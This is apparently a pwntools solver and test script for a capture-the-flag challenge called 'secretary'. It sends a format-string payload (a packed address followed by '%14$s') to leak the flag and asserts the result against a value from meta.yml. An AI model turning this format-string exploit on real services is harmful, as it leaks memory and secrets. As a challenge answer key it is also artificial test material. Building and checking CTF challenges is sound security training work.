import os
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def solve(sh):
    sh.recv()
    sh.sendline(b"1")
    sh.recv()
    payload = p32(0x56559040) + b"%14$s\x00"
    sh.sendline(payload)
    sh.recv()
    sh.sendline(b"2")
    sh.recvline()
    flag = sh.recvline()[4:].decode()
    assert FLAG in flag, flag


def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    sh = process("./src/chall")
    solve(sh)
